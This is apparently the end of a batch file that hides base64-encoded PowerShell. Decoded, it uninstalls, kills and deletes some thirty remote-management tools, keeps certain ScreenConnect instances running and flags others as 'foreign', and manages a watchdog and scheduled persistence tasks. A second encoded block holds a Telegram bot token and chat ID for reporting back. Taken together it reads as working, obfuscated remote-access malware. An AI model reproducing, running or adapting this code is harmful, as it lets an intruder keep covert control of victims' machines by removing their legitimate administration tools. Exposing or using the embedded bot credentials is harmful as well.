ZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9QCgnbnhkKicsJ254c2VydmVy
KicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hpbmUqJykg
fQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAgU3ZjPUAoJ05pbmphUk1NQWdlbnQnLCdu
aW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdOaW5qYVJNTUFnZW50KicsJ25pbmphcm1t
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdlbnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcTmluamFSTU1B
Z2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0qJywnTmluamFPbmUqJykgfQogICAgICAg
IEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVy
YUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVudjpQcm9ncmFtRGF0YVxB
VEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0KICAgICAgICBAeyBUYWc9J0Nvbm5l
Y3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKics
J0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3JhbUZpbGVz
XExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExhYlRlY2ggQ2xpZW50
Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywnQ29ubmVjdFdpc2UgUk1NKicsJ0xh
YlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlhJzsgICAgICAgU3ZjPUAoJ0FnZW50TW9u
JywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0FnZW50TW9uKicsJ0thc2V5YSonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
S2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdLYXNleWEgQWdlbnQqJykgfQogICAgICAg
IEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
JywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0ZW1BZ2VudConLCdOQ2Vu
dHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNlZCBNb25pdG9yaW5nIEFn
ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQi
LCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVzIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlByb2dyYW1GaWxlc1xNU1BBIEZp
bGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMiKTsgUHJvZD1AKCdBZHZh
bmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRyYWwqJywnTi1zaWdodCon
LCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQogICAgICAgIEB7IFRhZz0nU3lu
Y3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3luY3JvKics
J0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBhaXJUZWNoIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIkZW52OlByb2dyYW1GaWxlc1xTeW5jcm8i
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0YVxTeW5j
cm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQogICAgICAg
IEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJyk7
IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRvck1hbmFnZXIqJywnUHVsc2V3YXkqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3YXkiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxlc1xQQyBNb25pdG9yIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJvZD1AKCdQdWxzZXdheSonLCdQQyBNb25p
dG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAgIFN2Yz1AKCdTdXBlck9wcyon
KTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXBlck9w
cyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRlbnY6UHJvZ3JhbURhdGFc
U3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9CiAgICAgICAgQHsgVGFnPSdMZXZlbCc7
ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52
OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQogICAgICAgIEB7IFRhZz0n
QWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9QCgnQWN0aW9uMSonLCdhY3Rp
b24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjdGlvbjEiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6UHJvZ3JhbURhdGFcQWN0aW9uMSIpOyBQ
cm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRhZz0nTWFuYWdlRW5naW5lJzsgU3ZjPUAo
J01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFByb2M9QCgnTWFuYWdlRW5naW5l
KicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNYW5hZ2VF
bmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5naW5lIik7IFByb2Q9QCgn
TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKicsJ0VuZHBvaW50IENlbnRy
YWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0nOyAgU3Zj
PUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1AKCd0YWN0
aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGFjdGljYWxB
Z2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQqJywnTWVz
aENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVzaENlbnRyYWwnOyAgU3ZjPUAoJ01lc2gg
QWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbConKTsgUHJvYz1AKCdNZXNoQWdlbnQqJywn
TWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnTWVzaCpBZ2VudCon
LCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdDb250aW51dW0nOyAgICBTdmM9QCgn
U0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdDb250aW51dW0qJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNB
QVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FBWionKSB9CiAgICAgICAg
QHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJp
c2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9CiAgICAgICAgQHsg
VGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJvdConLCdJbW15KicpOyBQcm9jPUAoJ0lt
bXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEltbXlCb3Qi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJvdCIsIiRlbnY6UHJvZ3JhbURhdGFcSW1t
eUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAgICAgIEB7IFRhZz0nQXV0b21veCc7ICAg
ICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1AKCdhbWFnZW50KicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
QXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9kPUAoJ0F1dG9tb3gqJykg
fQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9
QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVyKicsJ0Fj
cm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdE
b21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQcm9jPUAoJ0RvbW90eionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRG9t
b3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAgICBAeyBUYWc9J0F1dmlrJzsgICAgICAg
IFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXZpayIpOyBQcm9kPUAoJ0F1
dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3VkYVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEq
Jyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJh
Y3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlByb2dyYW1G
aWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwgUGxh
dGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdvcmtwbGFjZSonKSB9
CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBTdmM9QCgnR292ZXJsYW4qJyk7IFByb2M9
QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR292
ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR292ZXJsYW4iKTsgUHJvZD1AKCdHb3Zl
cmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAgICBTdmM9QCgnUERRKicpOyBQ
cm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERRRGVwbG95KicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BEUSBJbnZlbnRvcnkqJywn
UERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVhY2ggKCR0b29sIGluICRybW0pIHsKICAg
ICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9kKSB7
CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsK
ICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJGRuID0gKEdl
dC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
aXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4gLWxpa2UgJHBh
dCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGRuKSB7IExv
ZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJldHVybiB9CiAgICAgICAgICAgICAgICAg
ICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5ybW0rKzsgJGhpdCA9ICR0
cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAg
IH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5TdmMpIHsKICAgICAg
ICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAk
Xy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkgeyBMb2cgInJtbV9za2lw
X2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0KICAgICAgICAgICAgICAgICYgc2MuZXhl
IHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgU3RhcnQt
U2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAgICAgICAgICYgc2MuZXhlIGRlbGV0ZSAi
JCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhp
dCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29sLlRhZyld
IgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wu
UHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgU3RvcC1Q
cm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nfa2lsbGVk
ICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRpcnMpIHsKICAgICAgICAgICAgaWYgKCRk
IC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7CiAgICAgICAgICAgICAgICBpZiAo
SXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0b19kaXIgJGQiOyBjb250aW51
ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJtbSsrOyAk
aGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9CiAgICAgICAgICAgICAgICBl
bHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQogICAgICAg
ICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0KSB7IExvZyAicm1tX2V4dGVybWluYXRl
ZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3VtbWFyeSA9ICJleHRlcm1pbmF0ZSBzdmM9
JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHByb2R1Y3Q9JCgkbi5wcm9k
dWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWlsKSIKICAgIExvZyAkc3VtbWFyeQogICAg
cmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0ZS1TdGF0ZSB7CiAgICAkcHJpbSA9ICRu
dWxsOyAkYWx0ID0gJG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1l
ICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNo
ICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlmICgkbWF0Y2hlc1sxXSAtZXEg
JzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAg
ICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAkYWx0ID0g
IiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICc5
OTA4MTk4ZTY2OGU0NzUwJykgeyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAg
ICAgICAgfQogICAgfQogICAgJGZvcmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgk
c3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5v
dGluIEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JywnOTkwODE5OGU2Njhl
NDc1MCcpKSB7CiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQog
ICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0eQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3Rh
bCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNL
X0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwrKwogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNr
TmFtZSAoW3N0cmluZ10kaWRbJGtdKQogICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9
CiAgICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9
IGVsc2UgeyAnb3duX21vbi5jbWQnIH0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFz
a3NPaysrIH0KICAgIH0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1Q
YXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQogICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAg
ICAkcHJldiA9IEB7fQogICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUu
anNvbicKICAgIGlmIChUZXN0LVBhdGggJHN0YXRlUGF0aCkgewogICAgICAgIHRyeSB7IChHZXQt
Q29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbiku
UFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAk
Xy5WYWx1ZSB9IH0gY2F0Y2gge30KICAgIH0KICAgICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAo
JHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxD
b3VudCB9CiAgICBpZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAt
YW5kICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9
IFtvcmRlcmVkXUB7CiAgICAgICAgaG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAg
ICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5n
KCdvJykKICAgICAgICBidWlsZCAgICAgICAgPSAkQnVpbGQKICAgICAgICBwcmltICAgICAgICAg
PSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBhbHQg
ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAg
ICAgZm9yZWlnbiAgICAgID0gJGZvcmVpZ24KICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NP
awogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAg
ID0gJHdkCiAgICAgICAgaW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudAogICAgICAgIGxhc3RI
ZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRv
U3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0g
ZWxzZSB7ICRudWxsIH0pCiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAo
JHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQogICAgcmV0dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rp
b24pIHsKICAgICdpbml0JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsg
JGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZh
bHVlKSIgfSB9CiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRp
ZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1
ZSkiIH0gfQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51
bGwgfQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tz
LWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRhc2tzIH0KICAgICdzdGF0ZScgICAgICAgICAg
IHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0KICAgICdyZXBhaXIn
ICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAkRnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAg
eyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQogICAgJ2V4dGVybWluYXRlJyAgICAgeyBJbnZva2Ut
RXh0ZXJtaW5hdGUgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
